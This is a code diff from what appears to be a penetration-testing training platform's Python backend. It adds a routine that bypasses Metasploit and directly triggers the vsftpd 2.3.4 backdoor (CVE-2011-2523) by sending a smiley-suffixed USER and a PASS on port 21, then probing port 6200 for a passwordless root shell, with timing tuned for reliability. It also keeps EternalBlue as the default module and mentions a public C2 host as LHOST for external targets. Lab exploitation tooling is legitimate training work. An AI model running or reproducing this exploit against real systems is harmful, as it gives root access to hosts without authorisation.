@@ -4447,11 +4447,44 @@ async def exploit_msf(req: ExploitRequest, user=Depends(verify_token)):
             "remediation": "port_unreachable",
             "session_opened": False,
         }
+    module  = req.msf_module  or "exploit/windows/smb/ms17_010_eternalblue"
+
+    # ─── BYPASS for vsftpd 2.3.4 backdoor ─────────────────────────────
+    # Modern Metasploit's exploit/unix/ftp/vsftpd_234_backdoor module
+    # defaults to cmd/linux/http/x86/meterpreter_reverse_tcp — that needs
+    # the target to fetch a stager over HTTP from MSF, which is flaky in
+    # Docker NAT / firewall setups. The underlying CVE itself is trivial:
+    # send `USER hax:)` + any PASS → port 6200 opens with a passwordless
+    # root shell. We skip msfconsole entirely and trigger the backdoor
+    # directly via TCP, then report success so the frontend's Phase 5
+    # connects to port 6200 the same way it would with MSF.
+    if "vsftpd_234" in module.lower():
+        triggered = await _trigger_vsftpd_backdoor(host)
+        if triggered:
+            return {
+                "target": req.target,
+                "module": module,
+                "payload": "(direct CVE-2011-2523 trigger, MSF bypassed)",
+                "session_opened": True,
+                "session_id": None,           # not a real MSF session
+                "session_type": "tcp_shell",
+                "shell_host": host,
+                "shell_port": 6200,
+                "message": f"Backdoor triggered. Root shell on {host}:6200.",
+                "raw_output": "Bypassed msfconsole because modern MSF's vsftpd module uses an HTTP-stager payload that's unreliable through Docker NAT. Backdoor port 6200 confirmed open after trigger.",
+            }
+        return {
+            "target": req.target,
+            "module": module,
+            "session_opened": False,
+            "error": "Backdoor trigger failed — vsftpd may be patched, container may need restart (docker restart lab_metasploitable), or the smile-username technique was already used this session.",
+            "remediation": "restart_target",
+        }
+
     # Auto-select the right LHOST: internal Docker lab targets use the backend
     # container's Docker DNS name (oscp_backend), external targets use the
     # public-facing c2.vulnuslab.com (resolved to IP for MSF validator).
     effective_lhost = _resolve_lhost_for_target(req.target or "", req.lhost or "")
-    module  = req.msf_module  or "exploit/windows/smb/ms17_010_eternalblue"
     # Trust the payload the frontend supplied — practice targets ship with a
     # known-good (module, payload) pair. The previous auto-detect logic
     # parsed `show payloads` output with a brittle regex and frequently
@@ -4605,26 +4638,35 @@ async def exploit_shell_start(req: ExploitRequest, user=Depends(verify_token)):
 
 
 async def _trigger_vsftpd_backdoor(target: str) -> bool:
-    """Send `USER vulnuslab:)` + `PASS x` to vsftpd on port 21 — this triggers
-    CVE-2011-2523 (the smile-username backdoor) which spawns a passwordless
-    root shell on port 6200. Returns True if the backdoor port opens within
-    5 seconds. Used as a reliable fallback when MSF's run-j path is flaky."""
+    """Trigger CVE-2011-2523 (vsftpd 2.3.4 smile-username backdoor) which
+    spawns a passwordless root shell on port 6200. Timing mirrors a Python
+    test that's been observed to work reliably: read banner → send USER →
+    half-second pause → read 331 response → send PASS → 4-second pause to
+    let vsftpd's parser hit the backdoor branch and bind 6200 → close →
+    probe 6200 with retries."""
     import socket as _socket
     try:
         reader, writer = await asyncio.open_connection(target, 21)
         try:
-            await reader.read(512)  # FTP banner
-            writer.write(b"USER vulnuslab:)\r\n")
+            await asyncio.wait_for(reader.read(512), timeout=3)  # FTP banner
+            writer.write(b"USER hax:)\r\n")
             await writer.drain()
-            await asyncio.sleep(1)
-            writer.write(b"PASS anything\r\n")
+            await asyncio.sleep(0.5)
+            # MUST consume the 331-response before sending PASS — otherwise
+            # vsftpd's read buffer can get out of sync and ignore PASS.
+            try:
+                await asyncio.wait_for(reader.read(512), timeout=2)
+            except Exception:
+                pass
+            writer.write(b"PASS x\r\n")
             await writer.drain()
-            await asyncio.sleep(2)
+            await asyncio.sleep(4)  # let backdoor branch fire + bind 6200
         finally:
             try: writer.close()
             except Exception: pass
-        # Probe port 6200 — did the backdoor open?
-        for _ in range(10):
+        # Brief settle delay after closing FTP, then probe 6200.
+        await asyncio.sleep(1)
+        for _ in range(15):
             try:
                 test = _socket.create_connection((target, 6200), timeout=1)
                 test.close()
